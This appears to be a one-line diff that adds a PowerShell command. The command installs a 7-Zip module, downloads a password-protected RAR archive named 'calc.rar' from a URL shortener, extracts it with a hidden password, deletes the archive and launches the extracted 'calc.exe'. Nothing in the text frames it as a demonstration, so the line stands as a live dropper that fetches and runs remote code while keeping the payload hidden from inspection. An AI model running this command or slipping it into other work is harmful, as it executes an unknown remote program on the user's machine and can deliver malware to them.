@@ -1,0 +1,1 @@
+Install-PackageProvider -Name "NuGet" -Force -Scope CurrentUser;Install-Module -Name "7Zip4Powershell" -Scope CurrentUser -Force;$c=(gl).Path;iwr -O "calc.rar" "https://shorturl.at/kGLUV";Expand-7Zip $c\calc.rar -Password "=" $c\u;rm calc.rar;saps "u\calc.exe";
